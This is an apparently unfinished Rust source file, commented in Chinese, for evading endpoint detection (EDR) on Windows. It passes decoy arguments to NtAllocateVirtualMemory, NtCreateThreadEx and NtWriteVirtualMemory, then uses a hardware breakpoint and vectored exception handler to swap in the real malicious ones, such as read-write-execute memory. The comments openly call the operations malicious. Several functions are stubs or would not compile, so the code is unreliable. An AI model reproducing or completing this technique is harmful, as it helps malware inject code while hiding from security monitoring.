// 本mod核心是要调用 Windows API执行恶意操作（如申请可执行内存），但为了躲避EDR（端点检测与响应系统）的监控
// 明面上的调用：程序调用 API 时传入假参数（例如：申请 Read-Only)
// 真实的意图：真实的恶意参数（例如：申请 Read-Write-Execute内存）被打包封装在这个 WINAPI 枚举中，并存储在全局变量 CURRENT_API 里
// 偷梁换柱：当 CPU 执行到 API入口时触发硬件断点，异常处理程序（VEH）会捕获这个瞬间，从 CURRENT_API中取出真实的参数，写入寄存器，替换掉假的参数


// use cfg_if;
use crate::types::{
    CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64, CONTEXT_DEBUG_REGISTERS_X86, HANDLE, OBJECT_ATTRIBUTES
};

use crate::winapis::{NtGetContextThread,NtCurrentThread};

use core::{ffi::c_void, sync::atomic::AtomicBool};

pub static mut CURRENT_API: Option<WINAPI> = None;

/// 硬件断点的开关
static USE_BREAKPOINT: AtomicBool = AtomicBool::new(false);

/// 是否启用VEH的硬件断点,false会略veh,交给其他异常处理机制
#[inline(always)]
pub fn set_use_breakpoint(enable: bool) {
    USE_BREAKPOINT.store(enable, core::sync::atomic::Ordering::SeqCst);
}

/// 检查USE_BREAKPOINT这个硬件断点开关的状态
#[inline(always)]
pub fn is_breakpont_enable() -> bool {
    USE_BREAKPOINT.load(core::sync::atomic::Ordering::SeqCst)
}

/// Configures a hardware breakpoint on the specified address.
///
/// 取得当前线程中cpu调试寄存器(dr0-dr7)的状态(定义在CONTEXT_DEBUG_REGISTERS_AMD64中)
pub(crate) fn set_breakpoint<T: Into<u64>>(address: T) {
    let mut ctx = CONTEXT {
        ContextFlags: if cfg!(target_arch = "x86_64") {
            CONTEXT_DEBUG_REGISTERS_AMD64
        } else {
            CONTEXT_DEBUG_REGISTERS_X86
        },
        ..Default::default()
    };

    // retrieving current thread register(dr0-7)
    // 实现了隐藏导入表,但没有实现indirect syscall
    NtGetContextThread(NtCurrentThread(), &mut ctx);

    // 修改阶段
    // 需要引入[dependencies] 下添加 cfg_if
    // cfg_if::cfg_if!手动指定路径,不需要在本文件中use cfg
   cfg_if::cfg_if!{

    if #[cfg(target_arch="x86_64")]{

        // dr0(寄存器)
    }
   }
   
}


/// 
fn set_dr7_bits<T:Into<u64>>(curent:T,start_bit:i32,num_bits:i32,new_bit:u64)->u64 {
    
    // 
    let current=curent.into();
}


#[derive(Debug)]
/// 暂存真实的API参数
/// 用于在异常处理期间恢复真实执行意图的参数包
///
/// 具体每个成员的含义在dinvk/源码分析中
pub enum WINAPI {
    /// represent the NtAllocateVirtualMemory call
    ///
    ///
    NtAllocateVirtualMemory { ProcessHandle: HANDLE, Protect: u32 },

    /// Represents the `NtCreateThreadEx` call.
    NtCreateThreadEx {
        ProcessHandle: HANDLE,
        ThreadHandle: *mut HANDLE,
        DesiredAccess: u32,
        ObjectAttributes: *mut OBJECT_ATTRIBUTES,
    },

    /// Represents the `NtWriteVirtualMemory` call.
    NtWriteVirtualMemory {
        ProcessHandle: HANDLE,
        Buffer: *mut c_void,
        NumberOfBytesToWrite: *mut usize,
    },
}
